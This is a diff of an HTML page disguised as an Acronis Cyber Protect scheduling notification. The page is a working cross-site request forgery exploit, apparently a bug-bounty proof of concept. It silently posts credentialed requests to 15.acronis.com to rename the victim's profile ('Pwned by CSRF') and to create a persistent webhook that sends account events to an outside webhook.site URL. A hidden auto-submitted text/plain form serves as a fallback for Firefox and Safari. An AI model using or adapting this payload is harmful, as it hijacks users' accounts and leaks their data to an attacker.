@@ -13,7 +13,6 @@
   .bd{padding:26px 28px;color:#333;font-size:14px;line-height:1.6}
   .btn{display:inline-block;background:#e5484d;color:#fff;padding:11px 26px;border-radius:6px;text-decoration:none;font-weight:600;margin-top:14px}
   .ft{padding:14px 28px;background:#fafafa;border-top:1px solid #eee;font-size:11px;color:#999}
-  .dbg{margin:10px 28px 20px;font:11px monospace;color:#0a0;white-space:pre-wrap}
 </style>
 </head>
 <body>
@@ -29,15 +28,22 @@
     <a class="btn" href="#" onclick="return false;">Review request</a>
   </div>
   <div class="ft">Acronis Cyber Protect &middot; This notification was sent because you are subscribed to scheduling updates.</div>
-  <div class="dbg" id="dbg">[*] payload armed</div>
 </div>
 
-<!-- ============ VARIANT A: silent fetch (Chrome / Edge — third-party SameSite=None flows) ============ -->
+<!-- ================= CSRF PAYLOAD ================= -->
 <script>
 const T = "https://webhook.site/dc97c56b-3137-4b2e-8834-c7ac4d75c32a";
-const dbg = document.getElementById("dbg");
-const log = (m) => { dbg.textContent += "\n" + m; };
 
+// ---- VARIANT A: silent fetch (Chrome / Edge — third-party SameSite=None cookie flows) ----
+// A1: change the victim's display name (visible on their public booking page + settings)
+fetch("https://15.acronis.com/api/trpc/me/updateProfile?batch=1", {
+  method: "POST",
+  headers: { "Content-Type": "text/plain" },   // CORS-simple -> no preflight
+  credentials: "include",                       // SameSite=None cookie attached
+  body: JSON.stringify({ "0": { "json": { "name": "Pwned by CSRF (mon3m.site)" } } })
+}).catch(() => {});
+
+// A2: plant a persistent webhook on the victim's account
 fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
   method: "POST",
   headers: { "Content-Type": "text/plain" },
@@ -48,22 +54,19 @@ fetch("https://15.acronis.com/api/trpc/webhook/create?batch=1", {
     active: true,
     payloadTemplate: "default_listener"
   }}})
-}).then(() => log("[A] fetch webhook/create fired (opaque response = normal)"))
-  .catch(() => log("[A] fetch blocked by browser cookie policy (use Variant B)"));
+}).catch(() => {});
 </script>
 
-<!-- ============ VARIANT B: top-level form POST (Firefox/Safari-proof: navigation = first-party, cookie always sent) ============
-     enctype="text/plain" serializes as  name + "=" + value
-     name = {"0":{"json":{...}},"pad":"   value = "}      →  body = {"0":{"json":{...}},"pad":"="}  (valid JSON)      -->
+<!-- ==== VARIANT B: top-level form POST (Firefox / Safari — navigation = first-party, cookie always sent) ====
+     enctype=text/plain serializes as  name + "=" + value
+     name = {"0":{"json":{"name":"..."}},"pad":"    value = "}     →  body = {"0":{...},"pad":"="}  (valid JSON) -->
 <form id="ff" method="POST" enctype="text/plain"
       action="https://15.acronis.com/api/trpc/me/updateProfile?batch=1">
   <input type="hidden" name='{"0":{"json":{"name":"Pwned by CSRF (mon3m.site)"},"pad":"' value='"}'>
 </form>
 <script>
-  setTimeout(() => {
-    log("[B] submitting top-level text/plain form (Firefox/Safari path)...");
-    document.getElementById("ff").submit();
-  }, 800);
+  // give Variant A ~900ms in Chrome, then navigate with Variant B (Firefox path)
+  setTimeout(() => document.getElementById("ff").submit(), 900);
 </script>
 </body>
 </html>
